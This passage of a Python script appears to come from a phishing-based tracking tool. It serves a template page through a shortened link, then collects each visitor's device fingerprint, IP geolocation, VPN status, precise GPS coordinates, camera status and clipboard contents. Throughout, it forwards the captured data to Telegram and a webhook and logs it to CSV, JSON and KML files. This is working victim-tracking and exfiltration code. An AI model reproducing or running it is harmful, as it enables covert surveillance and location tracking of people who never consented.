            "ram": var_ram,
            "vendor": var_vendor,
            "render": var_render,
            "res": var_res,
            "browser": var_browser,
            "ip": var_ip,
            "geo": {
                "continent": "N/A", "country": "N/A", "region": "N/A",
                "city": "N/A", "org": "N/A", "isp": "N/A",
                "latitude": None, "longitude": None
            },
            "vpn": {"is_vpn": False, "api_checked": False},
            "location": {"status": "pending", "lat": None, "lon": None, "acc": None, "alt": None, "dir": None, "spd": None, "error": None},
            "camera": {"status": "pending", "error": None},
            "clipboard": [],
            "is_bot": True,
            "bot_reasons": bot_reasons
        }
        save_to_json_db(session_record)
        try:
            remove(filepath)
        except Exception:
            pass
        return
    
    is_vpn = False
    if var_ip != 'Not Available' and not ip_address(var_ip).is_private:
        is_vpn = check_vpn(var_ip)
        
    vpn_text = f"{R}YES (Proxy/VPN/Tor Detected!){W}" if is_vpn else f"{G}NO (Direct Residential/Mobile IP){W}"
    
    device_info = f"""{Y}[!] Device Information Received (Session: {var_sid}) :{W}

{G}[+] {C}OS         : {W}{var_os}
{G}[+] {C}Platform   : {W}{var_platform}
{G}[+] {C}Brand      : {W}{var_brand}
{G}[+] {C}Model      : {W}{var_model}
{G}[+] {C}CPU Cores  : {W}{var_cores}
{G}[+] {C}RAM        : {W}{var_ram}
{G}[+] {C}GPU Vendor : {W}{var_vendor}
{G}[+] {C}GPU        : {W}{var_render}
{G}[+] {C}Resolution : {W}{var_res}
{G}[+] {C}Browser    : {W}{var_browser}
{G}[+] {C}Public IP  : {W}{var_ip}
{G}[+] {C}Using VPN? : {vpn_text}
"""
    utils.print(device_info)
    
    var_continent = 'N/A'
    var_country = 'N/A'
    var_region = 'N/A'
    var_city = 'N/A'
    var_org = 'N/A'
    var_isp = 'N/A'
    var_geo_lat = None
    var_geo_lon = None
    
    geo_data = {}
    
    if ip_address(var_ip).is_private:
        utils.print(f'{Y}[!] Skipping IP recon because IP address is private{W}')
    else:
        try:
            rqst = requests.get(f'https://ipwhois.app/json/{var_ip}', timeout=5)
            if rqst.status_code == 200:
                geo_data = rqst.json()
                var_continent = str(geo_data.get('continent', 'N/A'))
                var_country = str(geo_data.get('country', 'N/A'))
                var_region = str(geo_data.get('region', 'N/A'))
                var_city = str(geo_data.get('city', 'N/A'))
                var_org = str(geo_data.get('org', 'N/A'))
                var_isp = str(geo_data.get('isp', 'N/A'))
                var_geo_lat = geo_data.get('latitude') or geo_data.get('lat')
                var_geo_lon = geo_data.get('longitude') or geo_data.get('lon')
                
                ip_info = f"""{Y}[!] IP Geolocation Information :{W}

{G}[+] {C}Continent : {W}{var_continent}
{G}[+] {C}Country   : {W}{var_country}
{G}[+] {C}Region    : {W}{var_region}
{G}[+] {C}City      : {W}{var_city}
{G}[+] {C}Org       : {W}{var_org}
{G}[+] {C}ISP       : {W}{var_isp}
"""
                utils.print(ip_info)
        except Exception as e:
            utils.print(f'{R}[-] {C}IP Geolocation Error: {W}{e}')
            
    info_json['is_vpn'] = is_vpn
    if geo_data:
        info_json.update(geo_data)
        
    send_telegram(info_json, 'device_info')
    send_webhook(info_json, 'device_info')
    
    session_record = {
        "sid": var_sid,
        "os": var_os,
        "platform": var_platform,
        "brand": var_brand,
        "model": var_model,
        "cores": var_cores,
        "ram": var_ram,
        "vendor": var_vendor,
        "render": var_render,
        "res": var_res,
        "browser": var_browser,
        "ip": var_ip,
        "geo": {
            "continent": var_continent,
            "country": var_country,
            "region": var_region,
            "city": var_city,
            "org": var_org,
            "isp": var_isp,
            "latitude": var_geo_lat,
            "longitude": var_geo_lon
        },
        "vpn": {
            "is_vpn": is_vpn,
            "api_checked": True
        },
        "location": {
            "status": "pending",
            "lat": None,
            "lon": None,
            "acc": None,
            "alt": None,
            "dir": None,
            "spd": None,
            "error": None
        },
        "camera": {
            "status": "pending",
            "error": None
        },
        "clipboard": [],
        "is_bot": False
    }

    existing = active_sessions.get(var_sid)
    if existing and 'clipboard' in existing and isinstance(existing['clipboard'], list):
        session_record['clipboard'] = existing['clipboard']

    active_sessions[var_sid] = session_record
    
    save_to_json_db(session_record)
    
    try:
        remove(filepath)
    except Exception:
        pass


def parse_location_info(filepath):
    with open(filepath, 'r') as result_file:
        results = result_file.read()
    if not results or results.strip() == '':
        try:
            remove(filepath)
        except Exception:
            pass
        return
        
    try:
        result_json = json.loads(results)
    except json.JSONDecodeError:
        utils.print(f'{R}[-] {C}JSON Decode Error on GPS Info : {R}{traceback.format_exc()}{W}')
        return
        
    var_sid = result_json.get('sid', 'N/A')
    status = result_json.get('status', 'failed')
    
    session_data = active_sessions.get(var_sid, None)
    
    if status in ('success', 'ip_fallback'):
        var_lat = result_json.get('lat', 'Not Available')
        var_lon = result_json.get('lon', 'Not Available')
        var_acc = result_json.get('acc', 'Not Available')
        var_alt = result_json.get('alt', 'Not Available')
        var_dir = result_json.get('dir', 'Not Available')
        var_spd = result_json.get('spd', 'Not Available')
        
        is_fallback = (status == 'ip_fallback')
        
        if is_fallback:
            loc_info = f"""{Y}[!] IP Geolocation Fallback (Session: {var_sid}) :{W}

{G}[+] {C}Latitude  : {W}{var_lat}
{G}[+] {C}Longitude : {W}{var_lon}
{G}[+] {C}Accuracy  : {W}{var_acc}
"""
        else:
            loc_info = f"""{Y}[!] Location Information Captured (Session: {var_sid}) :{W}

{G}[+] {C}Latitude  : {W}{var_lat}
{G}[+] {C}Longitude : {W}{var_lon}
{G}[+] {C}Accuracy  : {W}{var_acc}
{G}[+] {C}Altitude  : {W}{var_alt}
{G}[+] {C}Direction : {W}{var_dir}
{G}[+] {C}Speed     : {W}{var_spd}
"""
        utils.print(loc_info)
        
        if not is_fallback:
            send_telegram(result_json, 'location')
            send_webhook(result_json, 'location')
        
        gmaps_url = f'https://www.google.com/maps/place/{var_lat.strip(" deg")}+{var_lon.strip(" deg")}'
        utils.print(f'{G}[+] {C}Google Maps : {W}{gmaps_url}\n')
        
        gmaps_json = {'url': gmaps_url, 'sid': var_sid}
        send_telegram(gmaps_json, 'url')
        send_webhook(gmaps_json, 'url')
        
        if kml_fname is not None:
            kmlout(var_lat, var_lon)
            
        loc_status = 'ip_fallback' if is_fallback else 'success'
        csv_gps_status = 'IP Estimate' if is_fallback else 'GPS Success'
            
        if session_data:
            session_data['location'] = {
                "status": loc_status,
                "lat": var_lat,
                "lon": var_lon,
                "acc": var_acc,
                "alt": var_alt if not is_fallback else None,
                "dir": var_dir if not is_fallback else None,
                "spd": var_spd if not is_fallback else None,
                "error": None
            }
            
            geo = session_data.get("geo", {})
            row = [
                var_sid, datetime.now().strftime('%Y-%m-%d %H:%M:%S'),
                session_data.get("os", "N/A"), session_data.get("platform", "N/A"),
                session_data.get("brand", "N/A"), session_data.get("model", "N/A"),
                session_data.get("cores", "N/A"), session_data.get("ram", "N/A"),
                session_data.get("vendor", "N/A"), session_data.get("render", "N/A"),
                session_data.get("res", "N/A"), session_data.get("browser", "N/A"),
                session_data.get("ip", "N/A"),
                geo.get("continent", "N/A"), geo.get("country", "N/A"),
                geo.get("region", "N/A"), geo.get("city", "N/A"),
                geo.get("org", "N/A"), geo.get("isp", "N/A"),
                csv_gps_status, var_lat, var_lon, var_acc, var_alt, var_spd
            ]
            csvout(row)
            
            update_json_db(var_sid, session_data)
        else:
            row = [
                var_sid, datetime.now().strftime('%Y-%m-%d %H:%M:%S'),
                'N/A', 'N/A', 'N/A', 'N/A', 'N/A', 'N/A',
                'N/A', 'N/A', 'N/A', 'N/A', 'N/A',
                'N/A', 'N/A', 'N/A', 'N/A', 'N/A', 'N/A',
                csv_gps_status, var_lat, var_lon, var_acc, var_alt, var_spd
            ]
            csvout(row)
            
            standalone_gps = {
                "sid": var_sid,
                "location": {
                    "status": loc_status,
                    "lat": var_lat,
                    "lon": var_lon,
                    "acc": var_acc,
                    "alt": var_alt if not is_fallback else None,
                    "dir": var_dir if not is_fallback else None,
                    "spd": var_spd if not is_fallback else None,
                    "error": None
                }
            }
            save_to_json_db(standalone_gps)
            
    else:
        var_err = result_json.get('error', 'Unknown error')
        utils.print(f'{R}[-] Geolocation Error (Session: {var_sid}) : {C}{var_err}\n')
        send_telegram(result_json, 'error')
        send_webhook(result_json, 'error')
        
        if session_data:
            session_data['location'] = {
                "status": "failed",
                "lat": None,
                "lon": None,
                "acc": None,
                "alt": None,
                "dir": None,
                "spd": None,
                "error": var_err
            }
            
            geo = session_data.get("geo", {})
            row = [
                var_sid, datetime.now().strftime('%Y-%m-%d %H:%M:%S'),
                session_data.get("os", "N/A"), session_data.get("platform", "N/A"),
                session_data.get("brand", "N/A"), session_data.get("model", "N/A"),
                session_data.get("cores", "N/A"), session_data.get("ram", "N/A"),
                session_data.get("vendor", "N/A"), session_data.get("render", "N/A"),
                session_data.get("res", "N/A"), session_data.get("browser", "N/A"),
                session_data.get("ip", "N/A"),
                geo.get("continent", "N/A"), geo.get("country", "N/A"),
                geo.get("region", "N/A"), geo.get("city", "N/A"),
                geo.get("org", "N/A"), geo.get("isp", "N/A"),
                'GPS Denied', 'N/A', 'N/A', 'N/A', 'N/A', 'N/A'
            ]
            csvout(row)
            
            update_json_db(var_sid, session_data)
        else:
            row = [
                var_sid, datetime.now().strftime('%Y-%m-%d %H:%M:%S'),
                'N/A', 'N/A', 'N/A', 'N/A', 'N/A', 'N/A',
                'N/A', 'N/A', 'N/A', 'N/A', 'N/A',
                'N/A', 'N/A', 'N/A', 'N/A', 'N/A', 'N/A',
                'GPS Denied', 'N/A', 'N/A', 'N/A', 'N/A', 'N/A'
            ]
            csvout(row)
            
            standalone_gps = {
                "sid": var_sid,
                "location": {
                    "status": "failed",
                    "lat": None,
                    "lon": None,
                    "acc": None,
                    "alt": None,
                    "dir": None,
                    "spd": None,
                    "error": var_err
                }
            }
            save_to_json_db(standalone_gps)
            
    try:
        remove(filepath)
    except Exception:
        pass


def kmlout(var_lat, var_lon):
    with open(TEMP_KML, 'r') as kml_sample:
        kml_sample_data = kml_sample.read()

    kml_sample_data = kml_sample_data.replace('LONGITUDE', var_lon.strip(' deg'))
    kml_sample_data = kml_sample_data.replace('LATITUDE', var_lat.strip(' deg'))

    with open(f'{path_to_script}/{kml_fname}.kml', 'w') as kml_gen:
        kml_gen.write(kml_sample_data)

    utils.print(f'{Y}[!] KML File Generated!{W}')
    utils.print(f'{G}[+] {C}Path : {W}{path_to_script}/{kml_fname}.kml')


def csvout(row):
    write_header = not path.exists(DATA_FILE) or path.getsize(DATA_FILE) == 0
    with open(DATA_FILE, 'a', newline='') as csvfile:
        csvwriter = writer(csvfile)
        if write_header:
            csvwriter.writerow([
                'SID', 'Timestamp', 'OS', 'Platform', 'Brand', 'Model', 'CPU Cores', 'RAM', 'GPU Vendor', 'GPU Renderer',
                'Resolution', 'Browser', 'Public IP', 'Continent', 'Country', 'Region', 'City',
                'Org', 'ISP', 'GPS Status', 'Latitude', 'Longitude', 'Accuracy', 'Altitude', 'Speed'
            ])
        csvwriter.writerow(row)
    utils.print(f'{G}[+] {C}Data Saved : {W}{path_to_script}/db/results.csv\n')


def clear():
    for f in glob.glob(f'{LOG_DIR}/*.info.json') + glob.glob(f'{LOG_DIR}/*.gps.json') + glob.glob(f'{LOG_DIR}/*.camera.json') + glob.glob(f'{LOG_DIR}/*.clipboard.json'):
        try:
            remove(f)
        except Exception:
            pass


def cl_quit():
    if not path.isfile(PID_FILE):
        return
    with open(PID_FILE, 'r') as pid_info:
        pid = int(pid_info.read().strip())
        try:
            if PSUTIL_AVAILABLE:
                old_proc = psutil.Process(pid)
                old_proc.kill()
            else:
                kill_process(pid)
        except Exception:
            pass
    try:
        remove(PID_FILE)
    except Exception:
        pass
    sys.exit()


def wait():
    printed = False
    while True:
        sleep(1.5)
        
        info_files = sorted(glob.glob(f'{LOG_DIR}/*.info.json'))
        for fpath in info_files:
            parse_device_info(fpath)
            printed = False

        gps_files = sorted(glob.glob(f'{LOG_DIR}/*.gps.json'))
        for fpath in gps_files:
            parse_location_info(fpath)
            printed = False

        cam_files = sorted(glob.glob(f'{LOG_DIR}/*.camera.json'))
        for fpath in cam_files:
            parse_camera_info(fpath)
            printed = False

        clip_files = sorted(glob.glob(f'{LOG_DIR}/*.clipboard.json'))
        for fpath in clip_files:
            parse_clipboard_info(fpath)
            printed = False

        if not info_files and not gps_files and not cam_files and not clip_files and printed is False:
            utils.print(f'{G}[+] {C}Waiting for Client... {Y}[ctrl+c to exit]{W}\n')
            printed = True


try:
    banner()
    clear()
    SITE = template_select(SITE)
    server()
    auto_shorten()
    wait()
except KeyboardInterrupt:
    utils.print(f'{R}[-] {C}Keyboard Interrupt.{W}')
    cl_quit()
